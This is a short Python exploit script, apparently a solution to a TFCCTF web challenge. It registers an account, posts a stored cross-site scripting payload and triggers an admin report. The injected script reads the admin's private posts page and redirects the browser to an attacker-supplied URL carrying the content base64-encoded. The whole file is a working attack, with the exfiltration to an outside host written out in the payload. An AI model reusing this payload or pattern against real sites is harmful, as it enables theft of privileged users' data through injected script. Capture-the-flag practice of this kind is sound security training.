#!/usr/bin/env python3
import requests, os

USERNAME, PASSWORD = os.urandom(10).hex(), os.urandom(10).hex()
BASEURL = f"http://challs.tfcctf.com:{input('Enter the port: ')}/"
REGEX = r"TFCCTF{.*?}"

PAYLOAD = f"""
<script>
async function attack(){{
    var xhr = new XMLHttpRequest();
    xhr.open("GET", "/posts/view/admin", true);
    xhr.responseType = "text";
    xhr.onload = () => {{
        window.location.href = "{input('Enter the url of your site: ')}?html=" + btoa(xhr.responseText.toString());
    }};
    await xhr.send(null);
}}
attack();
</script>
"""

with requests.Session() as s:
    resp = s.post(f"{BASEURL}/api/register", 
        json = {'username':USERNAME, 'password':PASSWORD}
    )
    print(resp.text.strip())
    resp = s.post(f"{BASEURL}/api/login", 
        json = {'username':USERNAME, 'password':PASSWORD}
    )
    print(resp.text.strip())
    resp = s.post(f"{BASEURL}/api/posts", 
        json = {"title":"flag", "content":PAYLOAD, "hidden":False}
    )
    print(resp.text.strip())
    resp = s.post(f"{BASEURL}/api/report")
    print(resp.text.strip())
    print("Check the requests to your site, the flag will be in an html encoded in base64")